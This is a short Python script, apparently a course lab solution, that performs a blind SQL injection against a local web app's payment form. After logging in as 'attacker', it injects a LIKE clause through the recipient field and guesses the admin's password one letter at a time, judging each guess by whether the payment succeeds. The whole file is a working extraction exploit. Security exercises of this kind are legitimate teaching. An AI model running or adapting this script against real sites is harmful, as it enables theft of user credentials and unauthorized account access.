from requests import codes, Session
import string

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    # You may need to include CSRF token from Exercise 1.5 in the POST request below
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "session_id": sess.cookies.get_dict()["session"]
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    old_password = None
    password = None
    isLastDigit = False
    prefix = username + "' and users.password LIKE '"
    # we assume the length of the password be lower than 40
    for j in range(40):
        if not isLastDigit:
            for i in string.ascii_lowercase:
                if password is not None:
                    password = old_password + "{}".format(i)
                else:
                    password = "{}".format(i)

                recipient = prefix + password + "%"
                print(recipient)
                if not submit_pay_form(sess, recipient, 0):
                    password = old_password
                    if i == string.ascii_lowercase[-1]:
                        isLastDigit = True
                        break
                else:
                    print(i)
                    old_password = password
                    break
        else:
            break
    print(password)

def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
